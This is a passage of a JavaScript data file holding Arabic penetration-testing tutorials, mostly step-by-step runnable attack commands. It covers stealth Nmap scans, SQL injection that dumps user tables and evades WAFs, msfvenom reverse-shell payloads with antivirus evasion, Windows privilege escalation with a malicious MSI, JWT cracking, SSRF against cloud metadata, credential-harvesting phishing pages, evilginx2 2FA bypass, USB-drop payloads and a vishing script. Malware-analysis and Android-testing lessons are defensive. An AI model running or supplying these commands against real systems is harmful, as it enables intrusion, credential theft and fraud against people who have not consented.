// ============================================================
// TUTORIALS EXTRA - 20 Additional Lessons (IDs 11-30)
// ============================================================
const TUTORIALS_EXTRA = [
{
  id:11, title:'فحص الشبكات بـ Nmap المتقدم', icon:'🌐', level:'intermediate', cat:'network',
  tags:['Nmap','Network','فحص المنافذ'],
  desc:'إتقان فحص الشبكات باستخدام Nmap مع تقنيات التخفي والسكريبتات المتقدمة.',
  steps:[
    { title:'فحص الاستطلاع الأولي', text:'ابدأ بفحص سريع للشبكة لاكتشاف الأجهزة الحية. -sn يفحص فقط دون مسح المنافذ. استخدم هذا لرسم خريطة الشبكة.', cmd:'nmap -sn 192.168.1.0/24 -oG alive_hosts.txt\nnmap -sn 192.168.1.0/24 | grep "Nmap scan report"', cmdDesc:'اكتشاف الأجهزة الحية في الشبكة' },
    { title:'فحص المنافذ الكاملة', text:'فحص جميع المنافذ 65535 مع تحسين السرعة. --min-rate يزيد سرعة الفحص، -T4 يضبط توقيت العدوانية.', cmd:'nmap -p- --min-rate 5000 -T4 192.168.1.10 -oN full_scan.txt', cmdDesc:'فحص جميع المنافذ TCP', note:'قد يثير هذا الفحص تنبيهات IDS/IPS في البيئات الحقيقية.' },
    { title:'كشف الإصدارات والخدمات', text:'-sV يحدد إصدار الخدمة، -sC يشغل الـ default scripts، -A يشغل كل شيء (OS detection + version + scripts). مجتمعةً تعطي صورة كاملة.', cmd:'nmap -sV -sC -A -p 22,80,443,3306 192.168.1.10', cmdDesc:'كشف إصدارات الخدمات وتشغيل السكريبتات الافتراضية' },
    { title:'فحص الثغرات بالسكريبتات', text:'Nmap NSE يحتوي آلاف السكريبتات. --script=vuln يشغل فحوصات الثغرات العامة. يمكن تحديد سكريبتات بعينها.', cmd:'nmap --script=vuln 192.168.1.10\nnmap --script=http-shellshock,http-sql-injection -p 80 192.168.1.10', cmdDesc:'فحص الثغرات التلقائي عبر NSE Scripts' },
    { title:'فحص UDP', text:'UDP أبطأ بكثير من TCP. -sU يفحص UDP. خدمات مهمة تعمل على UDP مثل DNS(53) SNMP(161) NTP(123).', cmd:'sudo nmap -sU -p 53,67,68,69,123,161,500 192.168.1.10', cmdDesc:'فحص المنافذ UDP المهمة', note:'يحتاج sudo لتشغيل UDP scan.' },
    { title:'التخفي وتجاوز الجدار الناري', text:'-sS (SYN scan) أبطأ أثراً، -D يستخدم decoys لإخفاء المصدر، --data-length يضيف padding لتجاوز بعض الفلاتر.', cmd:'sudo nmap -sS -D RND:10 192.168.1.10\nnmap -f --data-length 200 -T2 192.168.1.10', cmdDesc:'فحص تخفي مع Decoys و Fragmentation' },
    { title:'حفظ النتائج وتحليلها', text:'Nmap يدعم حفظ النتائج بصيغ متعددة: -oN نصي، -oX XML، -oG Grepable، -oA الثلاثة معاً. XML يُستخدم مع metasploit.', cmd:'nmap -sV -sC 192.168.1.0/24 -oA full_network_scan\ndb_import full_network_scan.xml  # في msfconsole', cmdDesc:'حفظ نتائج Nmap باستيرادها إلى Metasploit' }
  ]
},
{
  id:12, title:'اختبار SQL Injection المتقدم', icon:'💉', level:'advanced', cat:'web',
  tags:['SQL Injection','sqlmap','قواعد البيانات'],
  desc:'إتقان اختبار حقن SQL يدوياً وتلقائياً مع استخراج البيانات الحساسة.',
  steps:[
    { title:'اكتشاف نقطة الحقن', text:'ابدأ باختبار علامة الاقتباس لرؤية الخطأ. خطأ SQL يؤكد الثغرة. جرب أنواع مختلفة: string-based, integer-based, blind.', cmd:"curl 'http://target.com/page.php?id=1'  # طبيعي\ncurl 'http://target.com/page.php?id=1 AND 1=1'  # true\ncurl 'http://target.com/page.php?id=1 AND 1=2'  # false", cmdDesc:'اكتشاف SQL Injection يدوياً', note:'راقب الفرق في الاستجابة بين AND 1=1 وAND 1=2.' },
    { title:'تحديد عدد الأعمدة (ORDER BY)', text:'ORDER BY يحدد عدد أعمدة SELECT الأصلية. زد الرقم حتى يظهر خطأ - الرقم السابق للخطأ هو العدد الصحيح.', cmd:"curl 'http://target.com/page.php?id=1 ORDER BY 1--'\ncurl 'http://target.com/page.php?id=1 ORDER BY 5--'  # error", cmdDesc:'تحديد عدد أعمدة الاستعلام الأصلي' },
    { title:'UNION SELECT لاستخراج البيانات', text:'بعد معرفة عدد الأعمدة، استخدم UNION SELECT لحقن استعلام إضافي. العمود الظاهر في الصفحة هو الذي سنستخرج منه البيانات.', cmd:"curl 'http://target.com/page.php?id=-1 UNION SELECT 1,version(),3,database(),5--'", cmdDesc:'استخراج إصدار MySQL واسم قاعدة البيانات' },
    { title:'استخراج قائمة الجداول', text:'information_schema.tables يحتوي جميع الجداول. CONCAT لدمج القيم، GROUP_CONCAT لعرضها كلها في حقل واحد.', cmd:"curl 'http://target.com/page.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3--+FROM information_schema.tables WHERE table_schema=database()'", cmdDesc:'استخراج أسماء جميع الجداول' },
    { title:'استخراج محتوى الجداول', text:'بعد معرفة الجداول والأعمدة، استخرج البيانات. استهدف جدول users لكلمات المرور.', cmd:"sqlmap -u 'http://target.com/page.php?id=1' --dbs\nsqlmap -u 'http://target.com/page.php?id=1' -D database -T users --dump", cmdDesc:'استخراج محتوى جدول users بالكامل' },
    { title:'SQL Injection عبر POST', text:'كثير من الطلبات POST تحتوي ثغرات. sqlmap يدعم اعتراض طلبات Burp Suite مباشرة.', cmd:"sqlmap -r request.txt --dbs --batch\n# request.txt: احفظ طلب Burp كاملاً بما فيه headers", cmdDesc:'اختبار POST requests باستخدام ملف طلب Burp' },
    { title:'تجاوز WAF', text:'sqlmap يدعم tamper scripts لتجاوز Web Application Firewalls. space2comment يبدل المسافات بـ /**/ وهكذا.', cmd:'sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase --dbs', cmdDesc:'تجاوز WAF باستخدام Tamper Scripts', note:'استخدم --random-agent لتغيير User-Agent تلقائياً.' }
  ]
},
{
  id:13, title:'استخدام Burp Suite الاحترافي', icon:'🕷️', level:'intermediate', cat:'web',
  tags:['Burp Suite','Web Proxy','OWASP'],
  desc:'إتقان Burp Suite لاختبار تطبيقات الويب من الاعتراض إلى الاستغلال.',
  steps:[
    { title:'إعداد Burp Suite كـ Proxy', text:'Burp يعترض حركة HTTP بين المتصفح والخادم. اضبط Firefox ليستخدم 127.0.0.1:8080 كـ proxy، ثم قم بتثبيت شهادة Burp CA.', cmd:'burpsuite &\n# ثم في Firefox:\n# Settings > Network > Manual Proxy > 127.0.0.1:8080\n# زيارة http://burp لتحميل الشهادة', cmdDesc:'تشغيل Burp وإعداد المتصفح', note:'ثبت شهادة Burp CA لاعتراض HTTPS.' },
    { title:'استخدام Repeater', text:'Repeater يتيح إرسال نفس الطلب مرات متعددة مع تعديلات. أرسل الطلب من Proxy > Intercept إلى Repeater بـ Ctrl+R.', cmd:'# في Burp: click Repeater tab\n# عدل المعامل: id=1 → id=2\n# اضغط Send وراقب الاستجابة', cmdDesc:'تعديل وإعادة إرسال طلبات HTTP' },
    { title:'استخدام Intruder للـ Brute Force', text:'Intruder يؤتمت إرسال طلبات مع تغيير أجزاء منها. مفيد لـ brute force وfuzzing. حدد الـ payload positions أولاً.', cmd:'# أرسل الطلب لـ Intruder\n# Positions: حدد username وpassword\n# Payloads: أضف قائمة كلمات\n# Attack Type: Cluster Bomb', cmdDesc:'إعداد Intruder لـ Brute Force على نموذج تسجيل دخول', note:'Burp Community بطيء في Intruder - استخدم Burp Pro أو FFUF بديلاً.' },
    { title:'فحص تلقائي بالـ Scanner', text:'Burp Pro يحتوي Scanner يكتشف الثغرات تلقائياً. في Community نفذ Active Scan يدوياً من القائمة.', cmd:'# كليك يمين على الطلب > Do Active Scan\n# أو: Dashboard > New Scan > URL to scan', cmdDesc:'تشغيل فحص تلقائي للثغرات' },
    { title:'اكتشاف CSRF وإنشاء الـ PoC', text:'CSRF يحدث حين لا يتحقق التطبيق من مصدر الطلب. Burp يولد HTML PoC تلقائياً.', cmd:'# كليك يمين على الطلب > Engagement Tools > Generate CSRF PoC\n# احفظ الملف HTML واختبره في متصفح آخر', cmdDesc:'توليد PoC لثغرة CSRF' },
    { title:'استخدام Extensions', text:'BApp Store يحتوي مئات الإضافات. أهمها: Active Scan++, JWT Editor, Param Miner, Turbo Intruder.', cmd:'# Extender > BApp Store\n# ابحث عن: Param Miner\n# Install وشغله على أي طلب', cmdDesc:'تثبيت وتشغيل إضافات Burp Suite', note:'JWT Editor أداة لا غنى عنها لاختبار JWT tokens.' }
  ]
},
{
  id:14, title:'إنشاء واستخدام Payloads مع msfvenom', icon:'💣', level:'advanced', cat:'exploitation',
  tags:['msfvenom','Payload','Reverse Shell'],
  desc:'إنشاء payloads مخصصة لأنظمة مختلفة وأساليب التحايل على مضادات الفيروسات.',
  steps:[
    { title:'إنشاء Payload Windows exe', text:'msfvenom ينشئ payloads بصيغ متعددة. LHOST هو IP جهازك، LPORT المنفذ الذي ستستمع عليه. -f exe لصيغة Windows.', cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe', cmdDesc:'إنشاء Meterpreter Reverse TCP لـ Windows 64-bit' },
    { title:'إنشاء Payload Linux ELF', text:'ELF هو صيغة Linux التنفيذية. استخدم linux/x64/meterpreter/reverse_tcp للأنظمة الحديثة.', cmd:'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf\nchmod +x payload.elf', cmdDesc:'إنشاء Meterpreter Payload لـ Linux' },
    { title:'Payload لتطبيقات الويب (PHP)', text:'PHP shell مفيد إذا حصلت على صلاحية رفع ملفات. يعطيك webshell أو reverse shell كامل.', cmd:'msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php', cmdDesc:'إنشاء PHP Meterpreter Shell' },
    { title:'Payload لأندرويد APK', text:'msfvenom يمكنه إنشاء APK خبيث. مفيد في اختبارات الأجهزة المحمولة.', cmd:'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o malware.apk', cmdDesc:'إنشاء Android Meterpreter APK' },
    { title:'الاستماع للاتصالات (Handler)', text:'قبل تشغيل الـ payload على الضحية، يجب إعداد handler في Metasploit للاستماع على نفس المنفذ.', cmd:'msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nset LPORT 4444\nexploit -j', cmdDesc:'إعداد Multi/Handler لاستقبال الاتصالات' },
    { title:'التحايل على AV بالتشفير', text:'الـ payloads العادية تُكشف بسهولة. استخدم encoders وobfuscation. x86/shikata_ga_nai شيفرة شائعة، لكن تُعرف الآن.', cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe\n# أو استخدم Veil/Shellter للتحايل الأقوى', cmdDesc:'تشفير Payload للتحايل على مضادات الفيروسات', note:'استخدم VirusTotal.com (بدون إرسال للـ cloud) لاختبار معدل الكشف.' }
  ]
},
{
  id:15, title:'استطلاع OSINT المتقدم', icon:'🔍', level:'intermediate', cat:'recon',
  tags:['OSINT','Recon','theHarvester','Maltego'],
  desc:'جمع المعلومات مفتوحة المصدر عن الأهداف باستخدام أفضل أدوات OSINT.',
  steps:[
    { title:'جمع المعلومات بـ theHarvester', text:'theHarvester يجمع emails وdomains وIPs وأسماء موظفين من محركات بحث متعددة. استخدمه أولاً في أي تقييم.', cmd:'theHarvester -d target.com -b all -l 500 -f results.html\ntheHarvester -d target.com -b google,linkedin,bing', cmdDesc:'جمع بيانات OSINT من مصادر متعددة' },
    { title:'اكتشاف Subdomains', text:'النطاقات الفرعية كثيراً ما تحتوي خوادم غير مؤمنة. Subfinder وAmass من أفضل الأدوات.', cmd:'subfinder -d target.com -o subdomains.txt\namass enum -d target.com -o amass_results.txt\ncat subdomains.txt amass_results.txt | sort -u', cmdDesc:'اكتشاف النطاقات الفرعية' },
    { title:'استخدام Shodan', text:'Shodan محرك بحث متخصص بالأجهزة المتصلة بالإنترنت. يكشف خوادم مكشوفة وإصدارات قديمة.', cmd:'shodan search "target.com"\nshodan host 1.2.3.4\nshodan search "apache 2.2" --fields ip_str,port,org', cmdDesc:'استطلاع عبر Shodan', note:'تحتاج حساب Shodan. الخطة المجانية محدودة.' },
    { title:'فحص LinkedIn وSocial Media', text:'LinkedIn يكشف الهيكل التنظيمي وتقنيات الشركة. recon-ng يؤتمت هذا الجمع.', cmd:'recon-ng\nworkspaces create target_company\nmodules load recon/companies-contacts/linkedin_crawl\noptions set SOURCE "Target Company"\nrun', cmdDesc:'جمع بيانات الموظفين من LinkedIn' },
    { title:'بحث DNS المتعمق', text:'سجلات DNS تكشف بنية التحتية. dnsx وmassdns لفحص نطاقات واسعة.', cmd:'dnsx -d target.com -a -cname -mx -txt -resp -o dns_records.txt\nhost -t any target.com\nnslookup -type=ANY target.com 8.8.8.8', cmdDesc:'استخراج جميع سجلات DNS' },
    { title:'Google Dorks', text:'Google Dorks تجد معلومات حساسة مكشوفة على الإنترنت مثل ملفات config وصفحات إدارة.', cmd:'# ليس أوامر shell بل استعلامات Google:\n# site:target.com filetype:pdf\n# site:target.com inurl:admin\n# site:target.com ext:sql OR ext:env OR ext:config\n# "target.com" intitle:"index of"\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt', cmdDesc:'Google Dorks + اكتشاف المسارات الخفية', note:'استخدم أداة dork-scraper لأتمتة البحث.' }
  ]
},
{
  id:16, title:'تحليل الشبكات بـ Wireshark', icon:'🦈', level:'intermediate', cat:'network',
  tags:['Wireshark','tcpdump','Network Analysis'],
  desc:'التقاط وتحليل حركة الشبكة للكشف عن البيانات الحساسة والهجمات.',
  steps:[
    { title:'بدء التقاط الحزم', text:'Wireshark يحتاج صلاحيات root. اختر واجهة الشبكة الصحيحة (eth0 أو wlan0). يمكن البدء من الطرفية بـ tshark.', cmd:'wireshark &\n# أو من الطرفية:\nsudo tshark -i eth0 -w capture.pcap\nsudo tshark -i eth0 -c 1000 -w sample.pcap  # التقاط 1000 حزمة فقط', cmdDesc:'بدء التقاط حركة الشبكة' },
    { title:'فلترة الحزم', text:'Display filters في Wireshark قوية جداً. يمكن الفلترة حسب IP، Protocol، المنفذ، المحتوى.', cmd:'# في Wireshark Display Filter:\n# ip.addr == 192.168.1.10\n# tcp.port == 80\n# http.request.method == "POST"\n# dns\n# ftp\nsudo tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri', cmdDesc:'فلترة وتحليل الحزم' },
    { title:'اكتشاف بيانات HTTP غير مشفرة', text:'HTTP يرسل البيانات نصاً واضحاً. يمكن رؤية كلمات المرور وبيانات النماذج مباشرة.', cmd:"sudo tshark -i eth0 -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e urlencoded-form.value", cmdDesc:'التقاط بيانات نماذج HTTP (كلمات المرور)' },
    { title:'تحليل ARP للكشف عن Poisoning', text:'ARP Poisoning مؤشره كثير من ردود ARP من MAC مختلفة لنفس IP. Wireshark يكشفه بسهولة.', cmd:'# في Wireshark: arp\n# ابحث عن: "Duplicate IP address detected"\nsudo arpwatch -i eth0 -f /tmp/arp.dat', cmdDesc:'الكشف عن ARP Poisoning في الشبكة' },
    { title:'استخراج الملفات من الحزم', text:'Wireshark يستطيع إعادة تجميع ملفات نُقلت عبر HTTP. File > Export Objects > HTTP.', cmd:'# في Wireshark:\n# File > Export Objects > HTTP\n# اختر الملفات واحفظها\n# أو بـ tshark:\ntshark -r capture.pcap --export-objects "http,/tmp/http_objects"', cmdDesc:'استخراج الملفات المنقولة عبر HTTP' },
    { title:'تحليل ملفات PCAP باحتراف', text:'tcpdump لالتقاط، tshark وNetworkMiner وBrimللتحليل. strings مفيد لاستخراج النص الواضح سريعاً.', cmd:'strings capture.pcap | grep -i "password\|user\|login\|secret"\nnetworkMiner.exe  # على Windows\ncapinfos capture.pcap  # معلومات ملف pcap', cmdDesc:'تحليل متقدم لملفات PCAP', note:'NetworkMiner يستخرج الملفات والصور والبيانات الحساسة تلقائياً.' }
  ]
},
{
  id:17, title:'رفع الصلاحيات في Windows', icon:'👑', level:'advanced', cat:'exploitation',
  tags:['Windows','Privilege Escalation','PowerShell'],
  desc:'تقنيات رفع الصلاحيات من مستخدم عادي إلى SYSTEM في بيئة Windows.',
  steps:[
    { title:'جمع معلومات النظام الأولية', text:'بعد الوصول الأولي اجمع أكبر قدر ممكن من المعلومات عن النظام. systeminfo يعطي معلومات شاملة.', cmd:'systeminfo\nwhoami /all\nnet users\nnet localgroup administrators', cmdDesc:'استطلاع نظام Windows بعد الوصول الأولي' },
    { title:'WinPEAS للتعداد الآلي', text:'WinPEAS (Windows Privilege Escalation Awesome Scripts) يفحص آليائاً عشرات مسارات رفع الصلاحيات.', cmd:'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat\n# أو في PowerShell:\niwr -uri "http://your_ip/winPEAS.bat" -outfile winpeas.bat\n.\\winpeas.bat > winpeas_output.txt', cmdDesc:'تشغيل WinPEAS للبحث عن مسارات رفع الصلاحيات' },
    { title:'استغلال AlwaysInstallElevated', text:'إذا كانت AlwaysInstallElevated مفعلة، أي MSI يُنفَّذ بصلاحيات SYSTEM. تحقق منها ثم أنشئ MSI خبيثاً.', cmd:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi\nmsiexec /quiet /qn /i evil.msi', cmdDesc:'استغلال AlwaysInstallElevated للوصول SYSTEM' },
    { title:'Unquoted Service Path', text:'إذا كان مسار الخدمة غير محاط بعلامات اقتباس ويحتوي مسافات، يمكن وضع ملف في موقع يُنفَّذ بدلاً من الخدمة.', cmd:'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""\n# إذا وجدت خدمة: C:\\Program Files\\My Service\\service.exe\n# أنشئ ملف في: C:\\Program.exe', cmdDesc:'اكتشاف واستغلال Unquoted Service Paths' },
    { title:'Token Impersonation', text:'إذا كان لديك SeImpersonatePrivilege (IIS, SQLServer), يمكن استخدام Potato attacks للحصول على SYSTEM.', cmd:'whoami /priv  # ابحث عن SeImpersonatePrivilege\n# استخدم PrintSpoofer أو JuicyPotato:\n.\\PrintSpoofer64.exe -i -c cmd\n# أو في Meterpreter:\nuse incognito\nlist_tokens -u\nimpersonate_token "NT AUTHORITY\\SYSTEM"', cmdDesc:'Token Impersonation للوصول SYSTEM' },
    { title:'استغلال ثغرات Kernel', text:'Windows قديم قد يحتوي ثغرات kernel. Windows Exploit Suggester يقترح ثغرات بناءً على systeminfo.', cmd:'# على جهازك:\npython3 windows-exploit-suggester.py --update\npython3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt', cmdDesc:'اقتراح استغلالات Kernel بناءً على إصدار Windows', note:'MS17-010 (EternalBlue) وMS16-032 من أشهر الثغرات.' }
  ]
},
{
  id:18, title:'اختبار أمان APIs وREST', icon:'🔌', level:'intermediate', cat:'web',
  tags:['API','REST','Postman','JWT'],
  desc:'اختبار شامل لأمان APIs الحديثة بما في ذلك المصادقة والتفويض وحقن البيانات.',
  steps:[
    { title:'استطلاع وتعداد API', text:'ابدأ بإيجاد نقاط نهاية API المكشوفة. Gobuster وffuf يمكنهما فحص مسارات API.', cmd:'ffuf -u http://target.com/api/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt\ngobuster dir -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/Web-Content/swagger.txt', cmdDesc:'اكتشاف نقاط نهاية API المخفية' },
    { title:'تحليل JWT Tokens', text:'JWT يُستخدم للمصادقة في APIs الحديثة. تحقق من: الخوارزمية (alg:none)، سر ضعيف، ترميز غير صحيح.', cmd:'# فك تشفير JWT يدوياً:\necho "eyJhbGciOiJ..." | cut -d. -f2 | base64 -d 2>/dev/null\n# كسر JWT secret:\nhashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt', cmdDesc:'تحليل وكسر JWT Tokens' },
    { title:'اختبار IDOR', text:'IDOR (Insecure Direct Object Reference) يحدث حين يمكن الوصول لبيانات مستخدمين آخرين بتغيير ID. جرب أرقام مختلفة.', cmd:'# حساب user 1:\ncurl -H "Authorization: Bearer TOKEN" http://target.com/api/users/1\n# محاولة الوصول لحساب 2:\ncurl -H "Authorization: Bearer TOKEN" http://target.com/api/users/2\n# أو بـ ffuf:\nffuf -u http://target.com/api/users/FUZZ -w <(seq 1 1000) -H "Authorization: Bearer TOKEN"', cmdDesc:'اختبار IDOR بمحاولة الوصول لبيانات مستخدمين آخرين' },
    { title:'Mass Assignment Vulnerability', text:'إذا قبل الـ API حقول إضافية غير محددة، قد يمكن تعديل حقول مثل role أو is_admin.', cmd:'# طلب تسجيل عادي:\ncurl -X POST http://target.com/api/register -H "Content-Type: application/json" -d "{\"user\":\"test\",\"pass\":\"pass123\",\"role\":\"admin\"}"', cmdDesc:'اختبار Mass Assignment لتصعيد الصلاحيات' },
    { title:'اختبار Rate Limiting', text:'غياب Rate Limiting يسمح بـ brute force وharvesting. استخدم ffuf أو Burp Intruder للتحقق.', cmd:'# محاولات متعددة لتسجيل الدخول:\nfor i in $(seq 1 100); do\n  curl -s -o /dev/null -w "%{http_code}" -X POST http://target.com/api/login -d "{\"user\":\"admin\",\"pass\":\"password$i\"}"\ndone', cmdDesc:'اختبار غياب Rate Limiting في تسجيل الدخول' },
    { title:'استغلال SSRF في APIs', text:'SSRF يسمح للخادم بطلب موارد داخلية. جرب إرسال URL يشير لـ localhost أو شبكة داخلية.', cmd:'curl -X POST http://target.com/api/fetch -d "{\"url\":\"http://localhost:8080\"}" -H "Content-Type: application/json"\ncurl -X POST http://target.com/api/fetch -d "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"\n# 169.254.169.254 هو عنوان AWS metadata', cmdDesc:'اكتشاف واستغلال SSRF في APIs' }
  ]
},
{
  id:19, title:'هندسة اجتماعية وتصيد احترافي', icon:'🎭', level:'intermediate', cat:'exploitation',
  tags:['Social Engineering','Phishing','SET'],
  desc:'فهم تقنيات الهندسة الاجتماعية المستخدمة في اختبارات الاختراق المرخصة.',
  steps:[
    { title:'Social Engineering Toolkit (SET)', text:'SET الأداة الأشمل للهندسة الاجتماعية. يحتوي قوالب جاهزة لصفحات تصيد وهجمات متعددة.', cmd:'sudo setoolkit\n# اختر: 1) Social-Engineering Attacks\n# ثم: 2) Website Attack Vectors\n# ثم: 3) Credential Harvester', cmdDesc:'تشغيل SET لجمع بيانات الاعتماد' },
    { title:'إنشاء صفحة تصيد', text:'SET ينسخ أي موقع ويضبط الخادم. بعد إرسال البيانات تُجمع في ملف محلي.', cmd:'sudo setoolkit\n# 1 > 2 > 3 (Credential Harvester)\n# اختر: 2) Site Cloner\n# أدخل IP جهازك\n# أدخل URL الموقع: https://github.com/login', cmdDesc:'نسخ موقع واستضافته محلياً للتصيد', note:'استخدم فقط في بيئة مختبر مع إذن صريح.' },
    { title:'Email Phishing بـ GoPhish', text:'GoPhish إطار عمل احترافي لإدارة حملات تصيد. يتتبع من فتح الإيميل ومن ضغط الرابط.', cmd:'# تثبيت GoPhish:\nwget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip\nunzip gophish*.zip && chmod +x gophish\nsudo ./gophish\n# افتح: https://localhost:3333', cmdDesc:'تثبيت وتشغيل GoPhish' },
    { title:'إنشاء صفحات تصيد مخصصة', text:'evilginx2 يعمل كـ reverse proxy ويستطيع سرقة session cookies حتى مع 2FA.', cmd:'sudo evilginx2\n# اضبط domain وIP:\nconfig domain phish.example.com\nconfig ip YOUR_VPS_IP\n# نشر phishlet:\nphishlets hostname microsoft your.domain.com\nphishlets enable microsoft', cmdDesc:'استخدام evilginx2 لتجاوز 2FA في هجمات Phishing' },
    { title:'USB Drop Attack', text:'وضع USB مصاب في مكان عام من أقوى هجمات الهندسة الاجتماعية. استخدم Rubber Ducky أو USB محمول بـ autorun.', cmd:'# إنشاء HID payload:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe\n# الملف autorun.inf (مطلوب على Windows قديم):\n# [autorun]\n# open=payload.exe', cmdDesc:'إنشاء USB Drop Attack Payload', note:'USB Rubber Ducky هو الأفضل لهذا النوع من الهجمات.' },
    { title:'Vishing وSpoofing', text:'Caller ID Spoofing يغير رقم المتصل الظاهر. أدوات مثل SpoofCard وSpoofTel تستخدم في pentesting مرخص.', cmd:'# اختبار صوتي يدوي\n# سكريبت محادثة نموذجي:\necho "مرحباً، معكم فريق الدعم التقني...\nنحتاج تأكيد هويتك\nما كلمة المرور المؤقتة؟"', cmdDesc:'نموذج Vishing Script للتدريب على الوعي الأمني' }
  ]
},
{
  id:20, title:'تحليل البرمجيات الخبيثة Malware Analysis', icon:'🦠', level:'advanced', cat:'forensics',
  tags:['Malware','Reverse Engineering','Sandbox'],
  desc:'تحليل ثابت وديناميكي للبرمجيات الخبيثة لفهم سلوكها ومؤشراتها.',
  steps:[
    { title:'إعداد بيئة التحليل المعزولة', text:'لا تحلل Malware على نظامك الحقيقي أبداً. استخدم VM معزولة مع شبكة internal فقط أو استخدم REMnux.', cmd:'# تحقق من الملف أولاً:\nfile malware.exe\nmd5sum malware.exe\nsha256sum malware.exe\n# أرفعه على VirusTotal (مجهول):\n# https://virustotal.com', cmdDesc:'تحقق أولي من الملف الخبيث' },
    { title:'التحليل الثابت Static Analysis', text:'فحص الملف دون تشغيله. strings يستخرج النصوص، objdump وreadelf لـ ELF، pestudio وPEiD لـ Windows PE.', cmd:'strings malware.exe | grep -i "http\|ftp\|cmd\|powershell\|reg\|download"\nstrings malware.exe | grep -E "([0-9]{1,3}\\.){3}[0-9]{1,3}"\nexiftool malware.exe  # metadata\npestudio malware.exe  # على Windows', cmdDesc:'استخراج المعلومات الثابتة من الملف الخبيث' },
    { title:'التحليل الديناميكي مع Cuckoo Sandbox', text:'Cuckoo ينفذ الـ malware في بيئة معزولة ويسجل كل شيء: اتصالات شبكة، تعديلات registry، ملفات جديدة.', cmd:'# تثبيت Cuckoo:\npip install cuckoo\ncuckoo init && cuckoo web\n# إرسال للتحليل:\ncuckoo submit malware.exe\n# أو عبر واجهة الويب:\nhttp://localhost:8080', cmdDesc:'تحليل Malware تلقائياً بـ Cuckoo Sandbox' },
    { title:'مراقبة السلوك مع Process Monitor', text:'على Windows: Process Monitor وProcess Explorer من Sysinternals يكشفان تفاصيل ما يفعله البرنامج.', cmd:'# على نظام Windows في VM:\n# شغل Process Monitor\n# ثم شغل malware.exe\n# فلتر: Process Name > malware.exe\n# راقب: File System, Registry, Network Activity\nregshot  # لمقارنة Registry قبل وبعد', cmdDesc:'مراقبة سلوك Malware في Windows VM' },
    { title:'تحليل حركة الشبكة للـ Malware', text:'Wireshark + INetSim يلتقطان الاتصالات الشبكية. INetSim يحاكي الإنترنت ليجعل الـ malware يعتقد أنه متصل.', cmd:'sudo inetsim &\nsudo tshark -i eth0 -w malware_traffic.pcap &\n# ثم شغل الـ malware\n# حلل الـ PCAP:\ntshark -r malware_traffic.pcap -Y "dns" -T fields -e dns.qry.name | sort -u', cmdDesc:'تحليل اتصالات الشبكة للبرمجيات الخبيثة' },
    { title:'Reverse Engineering مع Ghidra', text:'Ghidra من NSA، أداة مجانية لعكس هندسة البرامج. تحويل الكود الثنائي إلى C قابل للقراءة.', cmd:'ghidraRun\n# File > New Project > أضف الملف\n# Auto Analysis ثم انتظر\n# Symbol Tree > Functions > main\n# شاهد كود C المولَّد', cmdDesc:'استخدام Ghidra لعكس هندسة الـ Malware', note:'Ghidra مجاني وبديل ممتاز للـ IDA Pro المدفوع.' }
  ]
},
{
  id:21, title:'فحص تطبيقات الأندرويد', icon:'📱', level:'advanced', cat:'mobile',
  tags:['Android','APK','MobSF','Drozer'],
  desc:'اختبار أمان تطبيقات الأندرويد من تحليل APK إلى استغلال نقاط الضعف.',
  steps:[
    { title:'تحليل APK ثابت بـ APKTool', text:'APKTool يفك ضغط APK ويحول Dalvik bytecode إلى Smali. jadx يحوله إلى Java مقروء.', cmd:'apktool d application.apk -o decompiled/\n# تحويل إلى Java:\njadx -d java_output/ application.apk\n# البحث عن بيانات حساسة:\ngrep -r "password\|api_key\|secret\|token" decompiled/ java_output/', cmdDesc:'فك تشفير APK واستخراج الكود المصدري' },
    { title:'فحص AndroidManifest.xml', text:'AndroidManifest يكشف الصلاحيات والمكونات المكشوفة (activities, services, providers). المكونات exported=true قابلة للاستغلال.', cmd:'cat decompiled/AndroidManifest.xml | grep -i "exported\|permission\|debuggable"\n# ابحث عن:\n# android:debuggable="true"\n# android:exported="true"\n# android:allowBackup="true"', cmdDesc:'تحليل AndroidManifest لاكتشاف نقاط الضعف' },
    { title:'اختبار ديناميكي بـ MobSF', text:'Mobile Security Framework يجمع التحليل الثابت والديناميكي. يحتاج جهاز أندرويد حقيقي أو emulator.', cmd:'git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\ncd Mobile-Security-Framework-MobSF\n./setup.sh && ./run.sh 0.0.0.0:8000\n# افتح http://localhost:8000 وارفع APK', cmdDesc:'تشغيل MobSF لتحليل شامل للـ APK' },
